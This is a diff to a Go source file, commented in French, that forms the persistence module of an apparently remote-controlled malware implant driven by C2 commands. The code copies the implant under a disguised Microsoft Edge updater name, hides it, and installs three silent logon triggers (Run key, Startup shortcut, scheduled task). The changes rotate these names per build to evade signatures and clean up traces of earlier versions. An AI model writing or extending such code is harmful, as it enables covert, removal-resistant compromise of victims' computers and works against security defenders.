@@ -1,13 +1,15 @@
 // Persistance : démarrage avec Windows, à la demande.
 //
-// Deux moyens complémentaires, tous deux écrits dans la clé de l'utilisateur
-// courant — aucune élévation, aucun accès administrateur requis :
+// Trois ancrages indépendants, tous sans élévation :
 //
-//   - la clé Run du Registre (HKCU) ;
-//   - un raccourci dans le dossier Démarrage (si la clé est refusée).
+//  1. la clé Run du Registre (HKCU) — `"exe" -silent` ;
+//  2. un raccourci dans le dossier Démarrage, ciblant l'exécutable avec
+//     `-silent` (aucune fenêtre au logon) ;
+//  3. une tâche planifiée au logon (voir wipe.go), troisième filet.
 //
-// La valeur s'appelle « Francais2ndUpdate » : un nom d'application, pas un
-// nom emprunté à un composant Windows.
+// Les noms (valeur Run, fichier miroir, tâche) sont des variables : chaque
+// build peut les renouveler via -X, ce que fait build.ps1. Un nom fixe devient
+// vite une signature.
 package main
 
 import (
@@ -17,7 +19,6 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
-	"time"
 	"unicode/utf16"
 	"unsafe"
 )
@@ -27,9 +28,21 @@ var (
 	procRegDeleteVal  = advapi32DLL.NewProc("RegDeleteValueW")
 )
 
-const (
-	runKeyPath   = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
-	runValueName = "Francais2ndUpdate"
+const runKeyPath = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+
+// Empreintes modifiables à la compilation :
+//
+//	go build -ldflags "-X main.runValueName=… -X main.mirrorFileName=…"
+var (
+	runValueName   = "Francais2ndUpdate"
+	mirrorFileName = "msedgewebview2_update.exe"
+)
+
+// legacyRunNames et legacyMirrorName : empreintes des builds précédents, à
+// retirer au passage (elles sont désormais des signatures connues).
+var (
+	legacyRunNames   = []string{"Francais2ndUpdate"}
+	legacyMirrorName = "msedgewebview2_update.exe"
 )
 
 /* ------------------------------------------------------------------ */
@@ -52,8 +65,12 @@ func regSetValueString(root uintptr, sub, name, value string) error {
 		return err
 	}
 	const regSz = 1
+	// La taille se compte en octets UTF-16 (2 par unité + le zéro final) :
+	// len(value) compterait les octets UTF-8, et un chemin accentué
+	// (« Français ») déborde alors du tampon alloué par UTF16PtrFromString.
+	nUnits := len(utf16.Encode([]rune(value))) + 1
 	r, _, callErr := procRegSetValueEx.Call(h, uintptr(unsafe.Pointer(n)), 0,
-		uintptr(regSz), uintptr(unsafe.Pointer(v)), uintptr(len(value)+1)*2)
+		uintptr(regSz), uintptr(unsafe.Pointer(v)), uintptr(nUnits)*2)
 	if r != 0 {
 		return fmt.Errorf("RegSetValueEx = %d (%v)", r, callErr)
 	}
@@ -77,8 +94,7 @@ func regDeleteValue(root uintptr, sub, name string) error {
 	return nil
 }
 
-// regOpenKeyWrite ouvre une clé en écriture (KEY_SET_VALUE), sans vue 64
-// bits forcée : la clé Run existe dans les deux vues, on touche à la normale.
+// regOpenKeyWrite ouvre une clé en écriture (KEY_SET_VALUE).
 func regOpenKeyWrite(root uintptr, sub string) (uintptr, error) {
 	p, err := syscall.UTF16PtrFromString(sub)
 	if err != nil {
@@ -126,22 +142,18 @@ func unquote(s string) string {
 }
 
 // shadowDir est le dossier où vit la copie de repli : un dossier réellement
-// utilisé par Windows Update du navigateur, sans nom d'application suspect.
+// utilisé par la mise à jour du navigateur, sans nom d'application suspect.
 func shadowDir() string {
 	return filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "EdgeUpdate")
 }
 
-// shadowPath est la copie permanente. Le Registre et le dossier Démarrage la
-// visent en priorité : supprimer l'exécutable d'origine ne coupe pas le
-// démarrage, et un processus déjà en marche la recrée au prochain tour de
-// réparation.
+// shadowPath est la copie permanente : supprimer l'exécutable d'origine ne
+// coupe pas le démarrage.
 func shadowPath() string {
-	return filepath.Join(shadowDir(), "msedgewebview2_update.exe")
+	return filepath.Join(shadowDir(), mirrorFileName)
 }
 
-// persistMirror maintient la copie de repli à jour. Elle ne sert jamais
-// d'elle-même comme source (sinon rafraîchir une copie périmée serait
-// impossible).
+// persistMirror maintient la copie de repli à jour.
 func persistMirror() {
 	exe := currentExe()
 	if exe == "" {
@@ -172,6 +184,7 @@ func persistMirror() {
 		plog("persistance copie: " + err.Error())
 		return
 	}
+	hideFile(sh)
 	plog("persistance: copie de repli écrite (" + strconv.Itoa(len(data)) + " octets)")
 }
 
@@ -184,86 +197,68 @@ func runTarget() string {
 	return currentExe()
 }
 
-// runValue construit la valeur écrite dans le Registre, entre guillemets
-// (le chemin contient souvent « Français » et des espaces).
+// runValue est la valeur écrite dans le Registre : chemin entre guillemets
+// (il contient souvent « Français » et des espaces) suivi de `-silent`.
 func runValue() string {
 	exe := runTarget()
 	if exe == "" {
 		return ""
 	}
-	return `"` + exe + `"`
+	return `"` + exe + `" -silent`
 }
 
-// persistInstall ajoute le démarrage avec Windows si la configuration le
-// demande. Jamais d'erreur fatale : la persistance est un plus, pas une
-// condition de fonctionnement.
-//
-// Les deux mécanismes sont écrits (Registre **et** dossier Démarrage) : si
-// l'un est nettoyé, l'autre suffit. L'exécutable possède un instance unique
-// (mutex nommé dans main.go), deux déclencheurs ne font donc pas deux
-// processus.
+// persistInstall pose les trois ancrages. Jamais d'erreur fatale : la
+// persistance est un plus, pas une condition de fonctionnement.
 func persistInstall() {
 	if runValue() == "" {
 		return
 	}
 	persistMirror()
+	persistCleanupLegacy()
+	persistCleanupStale()
 
-	regErr := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, runValue())
-	vbsErr := persistStartupShortcut()
-	switch {
-	case regErr == nil && vbsErr == nil:
-		plog("persistance: installée (clé Run + dossier Démarrage) → " + runTarget())
-	case regErr == nil:
-		plog("persistance: installée (clé Run) → " + runTarget())
-	case vbsErr == nil:
-		plog("persistance: installée (dossier Démarrage) → " + runTarget())
-	default:
-		plog("persistance échouée : " + regErr.Error() + " / " + vbsErr.Error())
+	err := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, runValue())
+	if err != nil {
+		plog("persistance échouée : " + err.Error())
+		return
 	}
+	persistStartupLink()
+	persistTask()
+	plog("persistance: installée (Run + Démarrage + tâche) → " + runTarget())
 }
 
-// persistStartupShortcut écrit un .vbs dans le dossier Démarrage. Le script
-// tente la copie de repli, puis l'exécutable courant, pour survivre à la
-// suppression de l'un des deux.
-func persistStartupShortcut() error {
-	startup := os.Getenv("APPDATA") +
-		`\Microsoft\Windows\Start Menu\Programs\Startup`
-	if err := os.MkdirAll(startup, 0755); err != nil {
-		return err
+// persistCleanupLegacy retire les empreintes des builds précédents : valeur
+// Run obsolète, vieux miroir, script VBS du Démarrage.
+func persistCleanupLegacy() {
+	for _, name := range legacyRunNames {
+		if name != runValueName {
+			_ = regDeleteValue(hkeyCurrentUser, runKeyPath, name)
+		}
 	}
-	primary := runTarget()
-	fallback := currentExe()
-	if fallback == "" {
-		fallback = primary
+	old := filepath.Join(shadowDir(), legacyMirrorName)
+	if legacyMirrorName != mirrorFileName {
+		_ = os.Remove(old)
 	}
-	vbs := "Set o = CreateObject(\"WScript.Shell\")\r\n" +
-		"Set f = CreateObject(\"Scripting.FileSystemObject\")\r\n" +
-		"p = \"" + primary + "\"\r\n" +
-		"If Not f.FileExists(p) Then p = \"" + fallback + "\"\r\n" +
-		"If f.FileExists(p) Then o.Run \"\"\"\" & p & \"\"\"\", 0, False\r\n"
-	// BOM UTF-16LE : wscript lit un .vbs en ANSI par défaut, ce qui corrompt
-	// les chemins accentués (profil « caméléon ») et brise le démarrage.
-	return os.WriteFile(filepath.Join(startup, "sysupdate.vbs"), utf16LEBOM(vbs), 0644)
+	vbs := os.Getenv("APPDATA") +
+		`\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.vbs`
+	_ = os.Remove(vbs)
 }
 
-// utf16LEBOM encode un texte en UTF-16 little-endian avec BOM, format lu
-// correctement par Windows Script Host.
-func utf16LEBOM(s string) []byte {
-	u := utf16.Encode([]rune(s))
-	b := make([]byte, 2, 2+2*len(u))
-	b[0], b[1] = 0xFF, 0xFE
-	for _, r := range u {
-		b = append(b, byte(r), byte(r>>8))
-	}
-	return b
-}
-
-// persistRemove annule les deux mécanismes.
+// persistRemove annule la persistance (Registre, Démarrage, tâche, reliquats).
 func persistRemove() {
 	_ = regDeleteValue(hkeyCurrentUser, runKeyPath, runValueName)
-	startup := os.Getenv("APPDATA") +
+	for _, name := range legacyRunNames {
+		_ = regDeleteValue(hkeyCurrentUser, runKeyPath, name)
+	}
+	for _, p := range []string{startupLinkPath(), startupCopyPath()} {
+		if p != "" {
+			_ = os.Remove(p)
+		}
+	}
+	persistTaskRemove()
+	vbs := os.Getenv("APPDATA") +
 		`\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.vbs`
-	_ = os.Remove(startup)
+	_ = os.Remove(vbs)
 }
 
 // persistSet gère la commande !persist du C2.
@@ -274,20 +269,18 @@ func persistSet(arg string) string {
 			return "chemin de l'exécutable introuvable."
 		}
 		persistMirror()
+		persistCleanupLegacy()
 		err := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, runValue())
 		if err != nil {
-			if err2 := persistStartupShortcut(); err2 != nil {
-				return "échec des deux méthodes :\nregistre : " + err.Error() +
-					"\ndémarrage : " + err2.Error()
-			}
-			return "installé dans le dossier Démarrage :\n" +
-				os.Getenv("APPDATA") + `\...\Startup\sysupdate.vbs`
+			return "échec d'écriture de la clé Run :\n" + err.Error()
 		}
-		return "installé dans le Registre (clé Run, " + runValueName + ") :\n" + runValue()
+		persistStartupLink()
+		persistTask()
+		return "installé (Run + Démarrage + tâche), lancement silencieux :\n" + runValue()
 
 	case "off", "0", "disable", "non", "":
 		persistRemove()
-		return "persistance retirée (clé Run + dossier Démarrage)."
+		return "persistance retirée (Run, Démarrage, tâche)."
 
 	default:
 		return "usage : !persist on   ou   !persist off"
@@ -306,49 +299,4 @@ func persistStatus() string {
 		return "absente"
 	}
 	return v
-}
-
-/* ------------------------------------------------------------------ */
-/* Réparation                                                          */
-/* ------------------------------------------------------------------ */
-
-// persistRepair maintient la persistance vivante : la copie de repli et les
-// deux déclencheurs sont recréés si quelqu'un les supprime. Un exécutable
-// supprimé pendant l'exécution continue de tourner (Windows refuse de
-// déverrouiller l'image en cours), donc la copie manquante est réécrite au
-// passage suivant. Tourne tant que le payload est actif.
-func persistRepair() {
-	for {
-		time.Sleep(5 * time.Minute)
-		if stopped.Load() {
-			plog("persistance: réparation arrêtée par !stop")
-			return
-		}
-		if !cfg.Persist {
-			return
-		}
-		persistMirror()
-
-		want := runValue()
-		if want == "" {
-			continue
-		}
-		changed := false
-		if v := persistStatus(); v == "" || v == "absente" ||
-			!strings.EqualFold(unquote(v), unquote(want)) {
-			if err := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, want); err == nil {
-				changed = true
-			}
-		}
-		startup := os.Getenv("APPDATA") +
-			`\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.vbs`
-		if !fileExists(startup) {
-			if err := persistStartupShortcut(); err == nil {
-				changed = true
-			}
-		}
-		if changed {
-			plog("persistance: réparée (copie, clé Run et/ou Démarrage)")
-		}
-	}
 }
